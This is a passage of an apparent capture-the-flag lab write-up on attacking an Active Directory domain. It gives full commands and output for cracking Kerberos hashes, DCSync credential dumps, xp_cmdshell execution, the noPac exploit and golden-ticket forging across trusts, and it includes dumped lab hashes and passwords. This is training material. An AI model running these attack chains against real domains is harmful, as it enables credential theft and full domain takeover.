$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$4075b7b81811f75a4caed058a1ccca1a$1794b315405d07c6ae955c779768a502f44668371017cd98fd81c13dead10fd1a46eecf0b282d2ba2f80a8066c59b660f7151fa3c5b89802f23d85cd245fc2a65293c60122cf6a4192f5eef9bc593edc8e94d8d129084308f656da4342a34d61b18f0a097495c165c3db6d251106bb92e6c60deb447b2a878b474c1096a0e251abfaaff63a07ba050b1382047f9c8093bbf9d8cda80c649382f9c42f0b0b729d308b548bb2961ae4b26861bd8b9fa0501b8ab052f3937b0af60a18f932c978edfac2e034d67774925ac9e6833dc939d835bf1bea0ecc4987f23ba911365747d5dd21741236876b2cf513ca4f10f4e756643dc03ae454b2e67efac0dc7c02ea2fc95ebf78e4d8919e50aa5d1193b6f3f8b7fc9d7335bc55e7ef0c24d0a6c2b37bb98c63eb4b8f65feb1748851165593dbb85e1b22e4522f870c884abf4c3a608478850f16338063736209921f2aaaddd840163d447c19603a2d61328ebd50bf5af7e779e3ab19f059b8f1900b7be7ec4afeecfabbd4574f5f87da736737cad91c4922b59bb158ea12f6c61ce0bf93e816ea9a3a1c8aeb5665ae619056ffb8373fd5d37e4071ceb6089ffd4d6217190528e68beecd1e735f8f4eb0eb7aabf0a672245afe7c51976b8e580cbeec7edbc7401e390e8504ddad50c6ab489ab6d9bfb1e32584bc5076108cf577f92e6f7a6766d8d16104388d77e27df14c02a52089b27e06570e3910447c1149472e682c3ba04891b72e7d8a8fb37e9f8ce976caf14ed8524dd4bd36ade36702fdb06bb2ed59b35e6b8cdab58b20ebc5355f42840a0519d9a680dd1d14263588e949e9e85d09fb7ded3fd7fa51f51c4703a2f4cf9867785ade6c5e7188c38c76e24deb42cdee789ea53d06bbb5fdf21f1ff733b34aefd84af3b814832fcbfd661153000059e547a7209974b254e099e4348dbabe47f69eae5d4332c5979c6d72aad43a39ab041d5d39cf28f0409342b03c9d5294f917f57e704bf5287975539c035c12767b2c1040f115d6ba8e19eba9e4b6c65dea8e59287a5bdf166858d9368f679d243698e5a127e911d127009ed3c96bf59869ac23a870dc36e1ae57843e4c548604d9f3d64aea0f33d63c6fca6fd2626d346090cd68c68d9d754b5882d393801b3f89aafa4ef124c34ff9f6513c1fffc410934864f7d25c4e22c7311cb8339b85c4884e7168526b098585d1b8682e82664e4ba4165f7003abbcc8e5540612d10ba30158ae004cf55b4937cc0976d2bad6c054550ded2997f39c6ad5f30a551e168013d185fc33832d413dcf9145bf00cb574969141ccfd8408bb8ca4072f75caf076d5e5d7e49993d87a739a214e20cf61ebd2a830d5312122f97d9d40a6594a00b63627cd12d4ccc9fd0564fd39d40ea0ba575b47c7289bd503d2900246d7291f41ce5abd4b1f65fdba2cb6fbb68aa789b7c54a9eb6b2a645d7ddf22457fea19221f91fd3258420b1d1165c39c1887476d33ac233a8b9b190206f504d59d7685aaba66761f49d0948ebfd7743c043a7438119460b437f9e598a5f9f1a0aa3fa729347cc9b250791981f0a41af0b9cc656402f883a2f03118a30a82077334c6e38a1ece29a551e729a7bc0894d53c79b77cba3a875d449ad03ce1e15f3ee15c563e4a901aa7191565b00733b0:SyncMaster757
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/L...0733b0
Time.Started.....: Fri Mar  3 05:38:03 2023 (7 secs)
Time.Estimated...: Fri Mar  3 05:38:10 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1575.4 kH/s (1.05ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10582016/14344385 (73.77%)
Rejected.........: 0/10582016 (0.00%)
Restore.Point....: 10579968/14344385 (73.76%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: T0BiD0G -> Swans_Rule01
Hardware.Mon.#1..: Util: 78%

Started: Fri Mar  3 05:38:03 2023
Stopped: Fri Mar  3 05:38:11 2023
```

User:pass `adunn:SyncMaster757`

**Answer:** `SyncMaster757`

---
## DCSync
### Question 1:
![](./attachments/Pasted%20image%2020230303122758.png)

```
PS C:\tools> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
syncron        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

**Answer:** `syncron`

### Question 2:
![](./attachments/Pasted%20image%2020230303122809.png)

Run `secretsdump.py` with user `adunn`.

```
┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $secretsdump.py -outputfile inlanefreight_hashes -just-dc-user syncron INLANEFREIGHT/adunn@172.16.5.5 
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
syncron:5617:aad3b435b51404eeaad3b435b51404ee:d387b9d2d9f6dda51964194ad2376ee0:::
[*] Kerberos keys grabbed
syncron:des-cbc-md5:37d379bad326a7ef
[*] ClearText passwords grabbed
syncron:CLEARTEXT:Mycleart3xtP@ss!
[*] Cleaning up...
```

**Answer:** `Mycleart3xtP@ss!`

### Question 3:
![](./attachments/Pasted%20image%2020230303122820.png)

Again, run `secretsdump.py` with user `adunn`.

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $secretsdump.py -outputfile inlanefreight_hashes -just-dc-user khartsfield INLANEFREIGHT/adunn@172.16.5.5 
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\khartsfield:1138:aad3b435b51404eeaad3b435b51404ee:4bb3b317845f0954200a6b0acc9b9f9a:::
[*] Kerberos keys grabbed
inlanefreight.local\khartsfield:aes256-cts-hmac-sha1-96:07519ef64ddac489464c9c74fc497c293f3b354554cddb5e3b10c739271d02ad
inlanefreight.local\khartsfield:aes128-cts-hmac-sha1-96:705f7b22644d3332f49ab918e7e9fb2a
inlanefreight.local\khartsfield:des-cbc-md5:4cd53ebf9bb60b8a
[*] Cleaning up... 
```

**Answer:** `4bb3b317845f0954200a6b0acc9b9f9a`

---
## Privileged Access
### Question 1:
![](./attachments/Pasted%20image%2020230306195637.png)

Use query `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2` in `BloodHound`.

![](./attachments/Pasted%20image%2020230306203058.png)

**Answer:** `bdavis`


### Question 2:
![](./attachments/Pasted%20image%2020230306195644.png)

Under the `Analysis` tab, click `Shortest Paths to Unconstrained Delegation Systems`.

![](./attachments/Pasted%20image%2020230306205122.png)

**Answer:** `ACADEMY-EA-DC01`

### Question 3:
![](./attachments/Pasted%20image%2020230306195657.png)
*Hint: Use mssqlclient.py*

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> enable_xp_cmdshell
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
output                                                                             

--------------------------------------------------------------------------------   

1m_the_sQl_@dm1n_n0w!
```

**Answer:** `1m_the_sQl_@dm1n_n0w!`

---
##
### Question:
![](./attachments/Pasted%20image%2020230307091924.png)
*Hint: Pay careful attention to the section reading.*

"This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command."

**Answer:** `2021-42278&2021-42287`

### Question:
![](./attachments/Pasted%20image%2020230307091938.png)

Scan the target to find out if  it is vulnerable.

```
┌─[htb-student@ea-attack01]─[/opt/noPac]
└──╼ $sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
                                        
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

Execute the exploit.

```
┌─[htb-student@ea-attack01]─[/opt/noPac]
└──╼ $sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
                                        
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-KJVHYALNMWE$"
[*] MachineAccount "WIN-KJVHYALNMWE$" password = bZuyy!qTwneC
[*] Successfully added machine account WIN-KJVHYALNMWE$ with password bZuyy!qTwneC.
[*] WIN-KJVHYALNMWE$ object = CN=WIN-KJVHYALNMWE,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-KJVHYALNMWE$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-KJVHYALNMWE$
[*] Restored WIN-KJVHYALNMWE$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-KJVHYALNMWE$
[-] Delete computer WIN-KJVHYALNMWE$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
D0ntSl@ckonN0P@c!
```

**Answer:** `D0ntSl@ckonN0P@c!`

---
## Miscellaneous Misconfigurations
### Question 1:
![](./attachments/Pasted%20image%2020230307104025.png)

Run `Get-DomainUser` to find users wich is not required to have a password.

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\tools
PS C:\tools> Import-Module .\PowerView.ps1
PS C:\tools> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                           useraccountcontrol
--------------                                                           ------------------
guest                  ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                  PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ygroce               PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
ehamilton                              PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                         ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                  PASSWD_NOTREQD, NORMAL_ACCOUNT
```

**Answer:** `ygroce`

### Question 2:
![](./attachments/Pasted%20image%2020230307104037.png)

Run `Get-DomainUser` to find users who do not need Kerberos pre-authentication.

```
PS C:\tools> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl


samaccountname     : ygroce
userprincipalname  : ygroce@inlanefreight.local
useraccountcontrol : PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

Perform ASREPRoasting attack.

```
PS C:\tools> .\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: AS-REP roasting

[*] Target User            : ygroce
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=ygroce))'
[*] SamAccountName         : ygroce
[*] DistinguishedName      : CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\ygroce'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:BDFBEB6F826EA77E521A747DDED9DFD0$65D8F7FCB57BF9C9DF97161F4C67E4C4DDECCF12613E5B18FC3AF14E2327963DEAA2410ABA029F773DB806B2501948DA3CEFEB8A4515D7292AC4C840403943545B97A27CD885AFB7CD51EE3F2CD4C71D536DCA9155917C12C91D881FCD11BAA4FFF8F8E00CD6199555DC87ED96E13594F5462A6BFD011C0D266C48A7C36D8550D265C736D4237E8BD3383514E7AF686A4E7CBA1D3DB59AF4A28C500567477C972768EC9B6F3DD5D2AFF6C29CA38AF564B20503FB0206823A23CE50119F8D1D5B9DB4FE70875E49CAFB4FF7D09151454989A4A5FABD101025D11BFD0452310D78E829C87CD0227794D853EB1D656B955FD65D63CC93FC3C8DB134
```

Save the hash to a file.

```
┌──(kali㉿kali)-[~]
└─$ sudo nano ygroce.hash
```

Crack the hash.

```
┌──(kali㉿kali)-[~]
└─$ hashcat -m 18200 ygroce.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5899 MB (1024 MB allocatable), 4MCU

(...)

$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:bdfbeb6f826ea77e521a747dded9dfd0$65d8f7fcb57bf9c9df97161f4c67e4c4ddeccf12613e5b18fc3af14e2327963deaa2410aba029f773db806b2501948da3cefeb8a4515d7292ac4c840403943545b97a27cd885afb7cd51ee3f2cd4c71d536dca9155917c12c91d881fcd11baa4fff8f8e00cd6199555dc87ed96e13594f5462a6bfd011c0d266c48a7c36d8550d265c736d4237e8bd3383514e7af686a4e7cba1d3db59af4a28c500567477c972768ec9b6f3dd5d2aff6c29ca38af564b20503fb0206823a23ce50119f8d1d5b9db4fe70875e49cafb4ff7d09151454989a4a5fabd101025d11bfd0452310d78e829c87cd0227794d853eb1d656b955fd65d63cc93fc3c8db134:Pass@word
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:bdfbeb6f82...8db134
Time.Started.....: Tue Mar  7 04:47:58 2023 (6 secs)
Time.Estimated...: Tue Mar  7 04:48:04 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1606.1 kH/s (0.92ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10733568/14344385 (74.83%)
Rejected.........: 0/10733568 (0.00%)
Restore.Point....: 10731520/14344385 (74.81%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Pastilla -> PanSiE12
Hardware.Mon.#1..: Util: 79%

Started: Tue Mar  7 04:47:57 2023
Stopped: Tue Mar  7 04:48:06 2023
```

**Answer:** `Pass@word`

---
## Domain Trusts Primer
### Question:
![](./attachments/Pasted%20image%2020230307193554.png)

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\tools
PS C:\tools> Import-Module activedirectory
PS C:\tools> Get-ADTrust -Filter *


Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

**Answer:** `LOGISTICS.INLANEFREIGHT.LOCAL`

### Question:
![](./attachments/Pasted%20image%2020230307193604.png)

```
PS C:\tools> Import-Module .\PowerView.ps1
PS C:\tools> Get-DomainTrust


SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 3/29/2022 5:14:31 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 3/29/2022 4:48:04 PM
```

**Answer:** `FREIGHTLOGISTICS.LOCAL`

### Question:
![](./attachments/Pasted%20image%2020230307193612.png)

See the output in the previous question.

**Answer:** `Bidirectional`

---
##
### Question 1:
![](./attachments/Pasted%20image%2020230307201019.png)

```
PS C:\tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 02:01:23
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 10:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 8c6b7919c01a5c654c91922f9a13225c

* Primary:Kerberos-Newer-Keys *
    Default Salt : LOGISTICS.INLANEFREIGHT.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
      aes128_hmac       (4096) : ca289e175c372cebd18083983f88c03e
      des_cbc_md5       (4096) : fee04c3d026d7538

* Primary:Kerberos *
    Default Salt : LOGISTICS.INLANEFREIGHT.LOCALkrbtgt
    Credentials
      des_cbc_md5       : fee04c3d026d7538

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  71fc2147dcf21fed982e180c3ebc48b8
    02  e193e66c97fb2ff16f352c25c06a5009
    03  9b4087c331fcd37671b407cb4f0e44a2
    04  71fc2147dcf21fed982e180c3ebc48b8
    05  e193e66c97fb2ff16f352c25c06a5009
    06  0da90377100224d5635e529d358f1409
    07  71fc2147dcf21fed982e180c3ebc48b8
    08  1763ae4e99694dcf66700106bb303aa5
    09  024c0c0c71f6e1f89a8c3be922534f0d
    10  3523e29569b4a45d20d99b7937f40326
    11  1763ae4e99694dcf66700106bb303aa5
    12  024c0c0c71f6e1f89a8c3be922534f0d
    13  5f47d51dee42d3f9a52a2d464c291fe5
    14  1763ae4e99694dcf66700106bb303aa5
    15  b7196b13a4fc2a29c18de543912039c2
    16  64689c7d74d2f2908330c62e47b34d75
    17  023f316da4715dd596d4ae6d5b9049cc
    18  fec7644b22077323cc9770c91d205269
    19  5cacbc938eaeb1b3a58572dafed92d97
    20  684ef5f716d49e4274a4ceb48d5fd6ba
    21  99968ef6b4c440cbd652ce6718a9ba39
    22  99968ef6b4c440cbd652ce6718a9ba39
    23  fbd2d7aef9329e981cd1bfdef2924843
    24  38653e1cf10018a3ae60fdb681241f1b
    25  5efd3ccfb3589c3bd6d76738ceeffb92
    26  dcd5dfeec024fe725edcaab5953d2011
    27  d92dcf29cd473a6ebae4b3bca1e578a9
    28  ff0382afc6adb89c00d5bf90cd5f4eca
    29  d7d958214c25d0835547320a0f0faf49
```

**Answer:** `S-1-5-21-2806153819-209893948-922872689`

### Question 2:
![](./attachments/Pasted%20image%2020230307201027.png)

```
PS C:\tools> Import-Module .\PowerView.ps1
PS C:\tools> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

**Answer:** `S-1-5-21-3842939050-3880317879-2865463114-519`

### Question 3:
![](./attachments/Pasted%20image%2020230307201034.png)

```
PS C:\tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 02:01:23
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/7/2023 11:13:59 AM ; 3/4/2033 11:13:59 AM ; 3/4/2033 11:13:59 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session

mimikatz # exit
Bye!
PS C:\tools\mimikatz\x64> klist

Current LogonId is 0:0x86927

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/7/2023 11:13:59 (local)
        End Time:   3/4/2033 11:13:59 (local)
        Renew Time: 3/4/2033 11:13:59 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

mimikatz # exit
Bye!
PS C:\tools\mimikatz\x64> ls \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids


    Directory: \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/7/2022   2:31 PM             21 flag.txt


PS C:\tools\mimikatz\x64> type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
f@ll1ng_l1k3_d0m1no3$
```

**Answer:** `f@ll1ng_l1k3_d0m1no3$`

---
## Attacking Domain Trusts - Child -> Parent Trusts - from Linux
### Question:
![](./attachments/Pasted%20image%2020230308090304.png)

Perform DCSync on user `bross`.

```
┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $secretsdump.py inlanefreight.local/adunn@172.16.5.5 -just-dc-user INLANEFREIGHT/bross
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
[*] Kerberos keys grabbed
inlanefreight.local\bross:aes256-cts-hmac-sha1-96:538b551100c1815081893a64defdf323117557b933c8762c2783afe8eef9ecff
inlanefreight.local\bross:aes128-cts-hmac-sha1-96:6a645011e4b5948ed081a956eb515e7c
inlanefreight.local\bross:des-cbc-md5:152ab9ec52b00b0e
[*] Cleaning up...
```

**Answer:** `49a074a39dd0651f647e765c2cc794c7`

---
## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
### Question:
![](./attachments/Pasted%20image%2020230308090254.png)

Enumerating accounts for associated SPNs.

```
PS C:\Windows\system32> cd c:\tools
PS C:\tools> Import-Module .\PowerView.ps1
PS C:\tools> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
sapsso
```

Enumerating the `mssqlsvc` account.

```
PS C:\tools> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
